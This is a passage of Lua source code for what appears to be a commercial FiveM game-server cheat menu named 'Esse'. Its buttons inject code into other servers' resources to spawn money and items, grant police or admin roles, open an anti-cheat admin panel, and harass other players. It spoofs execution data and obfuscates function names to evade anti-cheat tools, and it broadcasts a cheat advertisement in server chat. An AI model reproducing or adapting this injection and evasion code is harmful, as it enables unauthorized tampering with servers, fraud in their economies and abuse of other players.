    ]])
            end,
        })
    end

    if GetResourceState("dpemotes") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Bring All Nearby Players",
            onSelect = function()
                Esse:Notify("success", "Esse", "Attempting to bring all players", 3000)
                MachoInjectThread(0, 'dpemotes', '', [[
                TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
            ]])
            end
        })
    end

    if GetResourceState("monitor") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Pedestrians Chase All",
            onSelect = function()
                Esse:Notify("success", "Esse", "Attempting to bring all players", 3000)
                MachoInjectResourceRaw('any', [[
        Citizen.CreateThread(function()
            local pedModel = GetHashKey("mp_m_freemode_01")
            RequestModel(pedModel)
            local timeout = GetGameTimer() + 5000
            while not HasModelLoaded(pedModel) and GetGameTimer() < timeout do
                Citizen.Wait(0)
            end
            if not HasModelLoaded(pedModel) then return end

            local players = GetActivePlayers()
            local npcs = {}

            for _, playerId in ipairs(players) do
                local targetPed = GetPlayerPed(playerId)
                if not targetPed or not DoesEntityExist(targetPed) or IsPedDeadOrDying(targetPed, true) then
                    goto continue
                end

                local pos = GetEntityCoords(targetPed)
                -- Spawn 5 aggressive NPCs around each player
                for i = 1, 5 do
                    local x = pos.x + (math.random() * 20 - 10)
                    local y = pos.y + (math.random() * 20 - 10)
                    local z = pos.z

                    local npc = CreatePed(4, pedModel, x, y, z, 0.0, true, false)
                    if npc ~= 0 and DoesEntityExist(npc) then
                        SetEntityAsMissionEntity(npc, true, true)
                        SetPedFleeAttributes(npc, 0, false)
                        SetPedCombatAttributes(npc, 46, true)  -- aggressive
                        SetPedAsEnemy(npc, true)
                        TaskCombatPed(npc, targetPed, 0, 16)
                        table.insert(npcs, npc)
                    end
                    Citizen.Wait(10)
                end
                ::continue::
            end

            SetModelAsNoLongerNeeded(pedModel)

            -- 🧹 Cleanup after 20s
            Citizen.Wait(20000)
            for _, npc in ipairs(npcs) do
                if DoesEntityExist(npc) then
                    DeleteEntity(npc)
                end
            end

            if _G.MachoMenuNotification then
                MachoMenuNotification("Esse Attacker", "NPCs chasing all players!", 2)
            end
        end)
    ]])
            end
        })
    end

    if GetResourceState('mc9-adminmenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "Admin Menu List (F8)",
            onSelect = function()
                Esse:Notify("success", "Esse", "Admin Menu List", 3000)

                MachoInjectResource2("AsThreadNs", "mc9-adminmenu", [[
            for id, ply in pairs(CurrentPlayers or {}) do
                if ply and ply.name and ply.id then


                    if ply.identifiers and ply.identifiers.ip then

                    else

                    end

                    if ply.identifiers and ply.identifiers.discord then

                    else
                    end
                end
            end
        ]])
            end,
        })
    end

    if GetResourceState('mc9-mainmenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "MC9 Item Spawner",
            onSelect = function()
                Esse:Notify("success", "Esse", "Spawning Items", 3000)
                MachoInjectResource2("AsThreadNs", "mc9-mainmenu", [[
        local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
        for i,v in pairs(data) do
            local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
        end
        ]])
            end,
        })
    end

    if GetResourceState('vMenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "Message Server",
            onSelect = function()
                Esse:Notify("success", "Esse", "Message Sent", 3000)

                MachoInjectResource2("AsThreadNs", "any", [[
                TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is repercing with Esse Bypass, the leading cheat in the market. Join our discord at https://discord.gg/6zXK6wNu')
            ]])
            end,
        })
    end


    if GetResourceState("amigo") == "started" then
        AddTrigger({
            type = "button",
            label = "Give Item #1",
            onSelect = function()
                Esse:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end


                local itemName = GetInput("Item Name", "")
                print("^7[^5Esse^7] [^3DEBUG^7]: Raw itemName =", tostring(itemName))

                if not itemName or itemName == "" then
                    Esse:Notify("error", "Esse", "No item name entered", 3000)
                    Esse:ShowUI()
                    return
                end



                local inputCount = GetInput("Item Count", "1")
                print("^7[^5Esse^7] [^3DEBUG^7]: Raw inputCount =", tostring(inputCount))

                local itemCount = tonumber(inputCount)
                if not itemCount or itemCount < 1 then
                    print("^7[^5Esse^7] [^1WARN^7]: Invalid count, defaulting to 1")
                    itemCount = 1
                end
                if itemCount > 100000 then
                    itemCount = 100000
                end

                itemName  = tostring(itemName or "")
                itemCount = tonumber(itemCount or 1)

                print("^7[^5Esse^7] [^3DEBUG^7]: Final itemName =", itemName)
                print("^7[^5Esse^7] [^3DEBUG^7]: Final itemCount =", itemCount)

                local success, err = pcall(function()
                    MachoInjectResourceRaw("amigo", string.format([[
                    -- Hook native functions safely
                    local function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then return end
                        _G[nativeName] = function(...)
                            print(("^7[^5Esse^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                    HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                    _G.Esse = {
                        TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                        TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                    }

                    print("^7[^5Esse^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                    _G.Esse.TSEvent('player:giveItem', { item = "%s", count = %d })
                ]], itemName, itemCount, itemName, itemCount))
                end)

                if not success then
                    print("^7[^5Esse^7] [^1ERROR^7]: string.format failed →", err)
                    print("^7[^5Esse^7] [^3DEBUG^7]: itemName =", tostring(itemName), "itemCount =",
                        tostring(itemCount))
                    Esse:Notify("error", "Esse", "String format failed — check console", 4000)
                else
                    print("^7[^5Esse^7] [^2INFO^7]: Injection completed successfully")
                end

                Esse:ShowUI()
            end
        })
    end

    local scriptsRunning = GetResourceState("scripts") == "started"
    local frameworkRunning = GetResourceState("framework") == "started"

    if scriptsRunning or frameworkRunning then
        local runningResource = scriptsRunning and "scripts" or "framework"
        AddTrigger({
            type = "button",
            label = "End Comserv",
            onSelect = function()
                Esse:Notify("Comserv", "Esse", "Action Removed you might have to spam this", 3000)
                MachoInjectResourceRaw(runningResource, [[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function g(n) return _G[decode(n)] end

                for i = 1, 1 do
                    lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                    g({87,97,105,116})(0)
                end
            ]])
            end
        })
    end

    if GetResourceState("es_extended") == "started" or GetResourceState("core") == "started" then
        AddTrigger({
            type = "button",
            label = "Setjob Police #1 (New)",
            onSelect = function()
                if GetResourceState("es_extended") == "started" then
                    Esse:Notify("Setjob", "Esse", "Your job has been set to police", 3000)
                    MachoInjectResource2("AsThreadNs", "es_extended", [[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                    hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                    local fake_execution_data = {
                        ran_from_cheat = false,
                        path = "core/server/main.lua",
                        execution_id = "324341234567890"
                    }

                    local original_GetInvokingResourceData = GetInvokingResourceData
                    GetInvokingResourceData = function()
                        return fake_execution_data
                    end

                    ESX.SetPlayerData("job", {
                        name = "police",
                        label = "Police",
                        grade = 3,
                        grade_name = "lieutenant",
                        grade_label = "Lieutenant"
                    })
                    GetInvokingResourceData = original_GetInvokingResourceData
                ]])
                elseif GetResourceState("core") == "started" then
                    Esse:Notify("Setjob", "Esse", "Your job has been set to police", 3000)
                    MachoInjectResource2("AsThreadNs", "core", [[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                    hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                    local fake_execution_data = {
                        ran_from_cheat = false,
                        path = "core/server/main.lua",
                        execution_id = "324341234567890"
                    }

                    local original_GetInvokingResourceData = GetInvokingResourceData
                    GetInvokingResourceData = function()
                        return fake_execution_data
                    end

                    ESX.SetPlayerData("job", {
                        name = "police",
                        label = "Police",
                        grade = 3,
                        grade_name = "lieutenant",
                        grade_label = "Lieutenant"
                    })
                    GetInvokingResourceData = original_GetInvokingResourceData
                ]])
                else

                end
            end
        })
    end

    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Set Job #2(Police)",
            onSelect = function()
                Esse:Notify("Setjob", "Esse", "Your job has been set to police", 3000)
                MachoInjectResourceRaw("any", [[
                local lp = LocalPlayer
                if lp and lp.state then
                    lp.state:set("job", {
                        name = "police",
                        label = "Police",
                        grade = 4,
                        grade_name = "sergeant"
                    }, true)

                else

                end
            ]])
            end
        })
    end

    if GetResourceState("codewave-sneaker-phone") == "started" then
        AddTrigger({
            type = "button",
            label = "Give Shoes Reward",
            onSelect = function()
                MachoInjectResource2("AsThreadNs", "codewave-sneaker-phone", [[
                function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                HookNative("TriggerEvent", function(originalFn, ...)
                    return originalFn(...)
                end)

                HookNative("TriggerServerEvent", function(originalFn, ...)
                    return originalFn(...)
                end)

                _G.Esse = {
                    TEvent = function(eName, ...)
                        return TriggerEvent(eName, ...)
                    end,
                    TSEvent = function(eName, ...)
                        return TriggerServerEvent(eName, ...)
                    end,
                }

                _G.Esse.TSEvent('delivery:giveRewardShoes', 1000)

            ]])
            end
        })
    end

    if GetResourceState("rzrp-base") == "started" then
        AddTrigger({
            type = "checkbox",
            label = "Ragdoll Players (RZRP)",
            checked = false,
            onSelect = function(checked)
                if checked then
                    Esse:Notify("Ragdoll", "Esse", "Ragdolling Nearby Players", 4000)
                    Injection("rzrp-base", [[
                    if not _G.EsseRagdollPlayersInitialized then
                        _G.EsseRagdollPlayersEnabled = true
                        _G.EsseRagdollPlayersInitialized = true

                        local function SafeWrap(fn)
                            return function(...)
                                local ok, result = pcall(fn, ...)
                                return ok and result or nil
                            end
                        end

                        local SafeThread      = SafeWrap(CreateThread)
                        local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                        local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                        local SafeGetPed      = SafeWrap(GetPlayerPed)
                        local SafeGetCoords   = SafeWrap(GetEntityCoords)
                        local SafeGetServerId = SafeWrap(GetPlayerServerId)
                        local SafeWait        = SafeWrap(Wait)

                        local function GetDistance(a, b)
                            return #(a - b)
                        end

                        -- Stop any existing ragdoll thread before creating a new one
                        if _G.EsseRagdollThread then
                            TerminateThread(_G.EsseRagdollThread)
                            _G.EsseRagdollThread = nil
                        end

                        _G.EsseRagdollThread = SafeThread(function()
                            while _G.EsseRagdollPlayersEnabled and _G.EsseRagdollPlayersInitialized do
                                local myPed = PlayerPedId()
                                local myCoords = SafeGetCoords(myPed)
                                if not myCoords then break end

                                local players = SafeGetPlayers()
                                if not players then break end

                                for _, pid in ipairs(players) do
                                    local targetPed = SafeGetPed(pid)
                                    if targetPed and targetPed ~= myPed then
                                        local targetCoords = SafeGetCoords(targetPed)
                                        if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                            local sid = SafeGetServerId(pid)
                                            if sid then
                                                SafeSTrigger('RZRP:Player:Slap', sid)
                                            end
                                        end
                                    end
                                end

                                SafeWait(2000)
                            end

                            _G.EsseRagdollThread = nil
                        end)
                    else
                        _G.EsseRagdollPlayersEnabled = true
                    end
                ]])
                else
                    Esse:Notify("Ragdoll", "Esse", "Stopped Ragdolling Players", 4000)
                    Injection("rzrp-base", [[
                    _G.EsseRagdollPlayersEnabled = false
                    _G.EsseRagdollPlayersInitialized = false
                    if _G.EsseRagdollThread then
                        TerminateThread(_G.EsseRagdollThread)
                        _G.EsseRagdollThread = nil
                    end
                ]])
                end
            end
        })
    end

    if GetResourceState("rzrp-base") == "started" then
        AddTrigger({
            type = "checkbox",
            label = "Bag Closest Players (RZRP)",
            checked = false,
            onSelect = function(checked)
                if checked then
                    Injection("rzrp-base", [[
                    if not _G.EsseBagPlayersInitialized then
                        _G.EsseBagPlayersEnabled = true
                        _G.EsseBagPlayersInitialized = true

                        local function SafeWrap(fn)
                            return function(...)
                                local ok, result = pcall(fn, ...)
                                return ok and result or nil
                            end
                        end

                        local SafeThread      = SafeWrap(CreateThread)
                        local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                        local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                        local SafeGetPed      = SafeWrap(GetPlayerPed)
                        local SafeGetCoords   = SafeWrap(GetEntityCoords)
                        local SafeGetServerId = SafeWrap(GetPlayerServerId)
                        local SafeWait        = SafeWrap(Wait)

                        local function GetDistance(a, b)
                            return #(a - b)
                        end

                        if _G.EsseBagThread then
                            TerminateThread(_G.EsseBagThread)
                            _G.EsseBagThread = nil
                        end

                        _G.EsseBagThread = SafeThread(function()
                            while _G.EsseBagPlayersEnabled and _G.EsseBagPlayersInitialized do
                                local myPed = PlayerPedId()
                                local myCoords = SafeGetCoords(myPed)
                                if not myCoords then break end

                                local players = SafeGetPlayers()
                                if not players then break end

                                for _, pid in ipairs(players) do
                                    local targetPed = SafeGetPed(pid)
                                    if targetPed and targetPed ~= myPed then
                                        local targetCoords = SafeGetCoords(targetPed)
                                        if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                            local sid = SafeGetServerId(pid)
                                            if sid then
                                                SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                            end
                                        end
                                    end
                                end

                                SafeWait(2000)
                            end

                            _G.EsseBagThread = nil
                        end)
                    else
                        _G.EsseBagPlayersEnabled = true
                    end
                ]])
                else
                    Injection("rzrp-base", [[
                    _G.EsseBagPlayersEnabled = false
                    _G.EsseBagPlayersInitialized = false
                    if _G.EsseBagThread then
                        TerminateThread(_G.EsseBagThread)
                        _G.EsseBagThread = nil
                    end
                ]])
                end
            end
        })
    end

    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Set Gang",
            onSelect = function()
                local gangName = ""
                local gangRank = 1
                Esse:HideUI()
                KeyboardInput("Gang Name", "", function(val)
                    if val and val ~= "" then
                        gangName = val
                    end
                end, "typeable")
                Wait(2300)
                KeyboardInput("Gang Rank", "", function(val)
                    if val and val ~= "" then
                        gangRank = tonumber(val) or 1
                    end
                end, "typeable")
                Wait(1000)
                local targetResource = GetResourceState("scripts") == "started" and "scripts" or "framework"
                local injectionCode = string.format([[
                LocalPlayer.state:set("gang", "%s", true)
                LocalPlayer.state:set("gang_rank", %d, true)
            ]], gangName, gangRank)
                Injection(targetResource, injectionCode)
                Esse:ShowUI()
                Esse:Notify("success", "Esse", "Gang Set", 4000)
            end
        })
    end

    if GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Give Item #2",
            onSelect = function()
                Esse:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end


                local itemName = GetInput("Item Name", "")
                print("^7[^5Esse^7] [^3DEBUG^7]: Raw itemName =", tostring(itemName))

                if not itemName or itemName == "" then
                    Esse:Notify("error", "Esse", "No item name entered", 3000)
                    Esse:ShowUI()
                    return
                end


                local inputCount = GetInput("Item Count", "1")
                print("^7[^5Esse^7] [^3DEBUG^7]: Raw inputCount =", tostring(inputCount))

                local itemCount = tonumber(inputCount)
                if not itemCount or itemCount < 1 then
                    itemCount = 1
                end
                if itemCount > 100000 then
                    itemCount = 100000
                end

                itemName  = tostring(itemName or "")
                itemCount = tonumber(itemCount or 1)



                local success, err = pcall(function()
                    MachoInjectResourceRaw("framework", string.format([[
                    TriggerServerEvent('drugs:receive', {
                        Reward = {
                            Name = "%s",
                            Amount = %d
                        }
                    })
                ]], itemName, itemCount))
                end)

                if not success then
                    Esse:Notify("error", "Esse", "String format failed — check console", 4000)
                else
                    Esse:Notify("success", "Esse", "Item Sent", 4000)
                end

                Esse:ShowUI()
            end
        })
    end

    if GetResourceState("WayTooCerti_3D_Printer") == 'started' then
        AddTrigger({
            type = "button",
            label = "Give Item #3",
            onSelect = function()
                MachoInjectResourceRaw("WayTooCerti_3D_Printer", [[
            local function Ak47Spawn()
            TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
            end
            Ak47Spawn()
        ]])
            end
        })
    end

    if GetResourceState("tm-base") == "started" then
        table.insert(events, {
            name = "Spawn Money #4",
            eventName = "give_metro_money_04",
            execute = function()
                MachoInjectResource2("AsThreadNs", "tm-base", [[
            TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
            ]])
            end
        })
    end


    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Set Chat Tag",
            onSelect = function()
                Esse:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end

                local tagName = GetInput("Chat Tag Name", "")
                if not tagName or tagName == "" then
                    Esse:ShowUI()
                    return
                end

                Wait(500)

                local colorInput = GetInput("Tag Color (R, G, B)", "0, 255, 0")
                if not colorInput or colorInput == "" then
                    colorInput = "255, 255, 255"
                end

                Wait(500)

                local targetResource = GetResourceState("scripts") == "started" and "scripts" or "framework"
                MachoInjectResourceRaw(targetResource, string.format([[
                LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
            ]], tagName, colorInput))

                Esse:ShowUI()
            end
        })
    end

    if GetResourceState("wasabi_multijob") == 'started' then
        AddTrigger({
            type = "button",
            label = "Set Job #3 (Police)",
            onSelect = function()
                MachoInjectResource2("AsThreadNs", "wasabi_multijob", [[
        local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
        CheckJob(job, true)
    ]])
                MachoInjectResource2("AsThreadNs", "wasabi_multijob", [[
        SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
    ]])
            end
        })
    end

    if GetResourceState("wasabi_multijob") == 'started' then
        AddTrigger({
            type = "button",
            label = "Set Job #2 (EMS)",
            onSelect = function()
                MachoInjectResource2("AsThreadNs", "wasabi_multijob", [[
        local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
        CheckJob(job, true)
    ]])
                MachoInjectResource2("AsThreadNs", "wasabi_multijob", [[
        SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
    ]])
            end
        })
    end


    if GetResourceState("ElectronAC") == 'started' then
        AddTrigger({
            type = "button",
            label = "ElectronAC Admin Panel",
            onSelect = function()
                MachoInjectResourceRaw("ElectronAC", [[
    SetNuiFocus(true, false)
    SendNUIMessage({
        action = "menu",
        data = {
            info = {
                adminContext = {
                    master = true,
                    permissions = { "all" }
                },
                identifiers = {
                    ["ip"] = "127.0.0.1",
                    ["license"] = "",
                    ["license2"] = "",
                },
                permissions = {
                    adminMenu = true,
                    whitelisted = true
                }
            },
            open = true,
            setOpen = true
        }
    })
    ]])
            end
        })
    end

    if GetResourceState("spoodyFraud") == 'started' then
        AddTrigger({
            type = "button",
            label = "Give Money #1",
            onSelect = function()
                MachoInjectResource2("AsThreadNs", 'spoodyFraud', [[
    function HookNative(nativeName, newFunction)
        local originalNative = _G[nativeName]
        if not originalNative or type(originalNative) ~= "function" then
            return
        end

        _G[nativeName] = function(...)
            return newFunction(originalNative, ...)
        end
    end

    HookNative("CreateThread", function(originalFn, ...)
        return originalFn(...)
    end)

    HookNative("TriggerServerEvent", function(originalFn, ...)
        return originalFn(...)
    end)

    function Spoody()
        for i = 1, 30 do
            TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
            TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

            Citizen.Wait(5)

            TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
            TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
        end
    end

    CreateThread(function()
        Spoody()
    end)
    ]])
            end
        })
    end

    KeyboardInput("Choose Menu Key", "", function(val)
        for vk, name in pairs(MappedKeys) do
            if name:lower() == val:lower() then
                MenuKey = name
                Wait(250)
                Esse:ShowUI()
                return
            end
        end
    end, "keybind")

    local lastSliderPress = 0
    local sliderDelay = 120

    while true do
        Wait(0)

        if FreecamEnabled then
            local hoveredOption = FreecamOptions[FreecamHoveredIndex]

            -- Scroll Wheel
            if IsControlJustReleased(0, 14) then -- Wheel Down
                FreecamHoveredIndex = (FreecamHoveredIndex % #FreecamOptions) + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "down" }))
            end

            if IsControlJustReleased(0, 15) then -- Wheel Up
                FreecamHoveredIndex = (FreecamHoveredIndex - 2) % #FreecamOptions + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "up" }))
            end

            if hoveredOption == "Shoot Weapon" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentWeaponIndex = (CurrentWeaponIndex - 2) % #FreecamWeaponList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentWeaponIndex = (CurrentWeaponIndex % #FreecamWeaponList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
            elseif hoveredOption == "Spawn Car" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentVehicleIndex = (CurrentVehicleIndex - 2) % #FreecamVehicleList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentVehicleIndex = (CurrentVehicleIndex % #FreecamVehicleList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
            end

            if IsDisabledControlPressed(0, 24) then
                local action = hoveredOption
                if action == "Shoot Weapon" then
                    local weapon = FreecamWeaponList[CurrentWeaponIndex]

                    if weapon == "WEAPON_PERMKILL" then
                        weapon = "WEAPON_TRANQUILIZER"
                    elseif weapon == "WEAPON_RPG_2" then
                        weapon = "WEAPON_AIRSTRIKE_ROCKET"
                    end

                    if weapon ~= LastWeaponFired then
                        LastWeaponFired = weapon


                        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            if GetResourceState("WaveShield") == "started" then
                                if _G.EsseFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon",
                                        function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCurrentPedWeapon",
                                        function(originalFn, ...) return originalFn(...) end)
                                    hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    hNative("ShootSingleBulletBetweenCoords",
                                        function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.EsseFreecamObject)
                                    local camRot = GetCamRot(_G.EsseFreecamObject, 2)
                                    local forward = RotationToDirection(camRot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local playerPed = PlayerPedId()
                                    local weaponHash = GetHashKey(weapon)

                                    local function Encode(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return table.concat(t, ",")
                                    end

                                    local weaponBytes = Encode(weapon)

                                    Injection(
                                    GetResourceState("monitor") == "started" and "monitor" or
                                    GetResourceState("WaveShield") == "started" and "WaveShield" or "any",
                                        string.format([[
                                    if not _G.EsseWeaponBypass then
                                        _G.EsseWeaponBypass = { enabled = false }
                                    end
                                    _G.EsseWeaponBypass.enabled = true

                                    local function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("GetHashKey", function(orig, str) return orig(str) end)
                                    hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                        if _G.EsseWeaponBypass and _G.EsseWeaponBypass.enabled then
                                            return orig(ped, hash, ammo, false, true)
                                        else
                                            return orig(ped, hash, ammo, isHidden, equipNow)
                                        end
                                    end)
                                    hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                        if _G.EsseWeaponBypass and _G.EsseWeaponBypass.enabled then
                                            return orig(ped, hash, true)
                                        else
                                            return orig(ped, hash, equipNow)
                                        end
                                    end)

                                    local function _b(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return t
                                    end
                                    local function _d(tbl)
                                        local s = ""
                                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                        return s
                                    end
                                    local function _g(n)
                                        local k = _d(n)
                                        local f = _G[k]
                                        return f
                                    end

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        local ped = %d
                                        if _g(_b("DoesEntityExist"))(ped) then
                                            local weaponName = _d({%s})
                                            local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                            if weaponHash and weaponHash ~= 0 then
                                                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                            end
                                        end
                                    end)

                                ]], playerPed, weaponBytes))

                                    -- MachoInjectThread(0, GetResourceState("monitor") and "monitor" or "any", "", [[
                                    --     function hNative(nativeName, newFunction)
                                    --         local originalNative = _G[nativeName]
                                    --         if not originalNative or type(originalNative) ~= "function" then
                                    --             return
                                    --         end

                                    --         _G[nativeName] = function(...)
                                    --             return newFunction(originalNative, ...)
                                    --         end
                                    --     end

                                    --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    --     hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    --     local camCoords = ]] .. camCoords .. [[
                                    --     local targetPos = ]] .. targetPos .. [[
                                    --     local weaponHash = GetHashKey(]] .. weapon .. [[)

                                    --     GiveWeaponToPed(PlayerPedId(), weaponHash, 250, false, true)
                                    --     SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                    -- ]])

                                    Wait(350)

                                    ShootSingleBulletBetweenCoords(
                                        camCoords.x, camCoords.y, camCoords.z,
                                        targetPos.x, targetPos.y, targetPos.z,
                                        100, -- damage
                                        true, -- isAudible
                                        weaponHash,
                                        PlayerPedId(),
                                        true, -- isInvisible
                                        false, -- isCritical
                                        100000.0 -- speed
                                    )
                                end
                            else
                                MachoInjectResourceRaw(
                                GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                if _G.EsseFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
